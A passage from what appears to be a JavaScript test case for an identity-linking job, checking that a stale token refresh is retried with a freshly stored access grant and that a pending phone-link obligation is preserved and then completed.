  await link.hold({ subject: 'sub-fictional', accessToken: 'expired', accessExpires: 0, refreshToken: 'old-refresh', resource: 'https://agent.example.test/api' });
  // The adoption wrote the obligation with the phone.
  await storage.put(await link.obligation('+15550100001'));
  const first = link.onJob({ job: { fn: 'hub-identity' } });
  await new Promise(resolve => setTimeout(resolve, 20));
  // A new sign-in stores a fresh, valid grant while the old refresh is in flight; then the old refresh is refused.
  await link.hold({ subject: 'sub-fictional', accessToken: 'fresh-access', accessExpires: Math.floor(Date.now() / 1000) + 900, resource: 'https://agent.example.test/api' });
  releaseRefresh();
  const outcome = await first;
  assert.ok(outcome?.rescheduleAt <= Date.now(), 'run again at once with the current grant');
  assert.equal(data.get('hub-identity-pending')?.phone, '+15550100001', 'the link obligation is kept');
  assert.equal(await link.onJob({ job: { fn: 'hub-identity' } }), undefined);
  assert.deepEqual(posts, [{ subjectToken: 'fresh-access', phone: '+15550100001' }]);
  assert.equal(data.get('hub-identity-pending'), undefined);
  assert.deepEqual(data.get('hub-identity-linked'), ['+15550100001']);
});
